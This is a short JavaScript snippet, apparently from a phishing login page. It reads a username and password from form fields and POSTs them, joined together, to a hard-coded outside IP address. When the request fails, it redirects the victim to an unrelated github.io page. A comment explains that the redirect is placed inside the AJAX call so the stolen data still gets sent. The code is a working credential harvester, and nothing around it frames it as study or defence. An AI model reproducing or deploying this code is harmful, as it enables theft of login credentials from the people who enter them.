<script>

function postData(user, pwd){
		$.ajax({
             url: "http://47.94.15.68:8080/pen/triger",
             type: "post",
			 crossDomain: true,
			 data:{"_triger": user + "-" + pwd},
			 dataType: "json",
             success: function(data, textStatus){
					 alert(data.msg);
			 },
			error:	function(XMLHttpRequest, textStatus, erroeThrown) {
	window.location="https://404zero.github.io/sh/heart/stars.html" ;
				}
		 });
}

function getPost(){
    var id= document.getElementById("bor_id").value;
    var pwd= document.getElementById('bor_verification').value;
	if(!id){
            alert("用户名称不能为空");
		    return false;
        }
    if(!pwd){
            alert("密码不能为空");
		    return false;
        }
	/* 须在ajax里进行跳转，
	若在此页面跳转，
	ajax数据无法传输
	*/
	postData(id, pwd);
	return false;
}
